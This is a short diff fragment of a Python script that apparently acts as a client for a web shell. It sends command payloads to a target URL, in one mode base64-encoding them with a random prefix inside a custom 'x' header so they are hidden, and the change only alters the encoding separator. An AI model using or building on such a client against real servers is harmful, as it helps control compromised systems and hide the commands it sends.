@@ -55,7 +55,7 @@ def requester(url, payload, shell):
         print (requests.get(url + payload , headers=headers).text)
     elif shell == 'ninja':
         bases = ['T', 'w', 'F', 'v', 'Z', 'n']
-        payload = random.choice(bases) + (base64.b64encode((function + '(' + payload + ')').encode('utf-8'))).decode('utf-8')
+        payload = random.choice(bases) + (base64.b64encode((function + '~' + payload).encode('utf-8'))).decode('utf-8')
         headers['x'] = payload
         print (requests.get(url, headers=headers).text)
 while True:
